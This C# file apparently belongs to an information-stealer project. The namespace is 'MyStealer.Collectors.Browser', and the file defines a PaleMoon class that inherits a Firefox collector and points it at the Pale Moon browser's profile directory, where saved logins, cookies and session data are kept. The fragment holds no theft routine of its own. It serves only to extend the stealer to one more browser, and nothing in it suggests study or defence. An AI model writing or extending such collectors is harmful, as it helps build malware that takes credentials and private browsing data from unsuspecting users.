using System;
using System.IO;

namespace MyStealer.Collectors.Browser.FirefoxBased
{
    internal class PaleMoon : Firefox
    {
        protected override string ProfilesPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Moonchild Productions", "Pale Moon", "Profiles");
    }
}
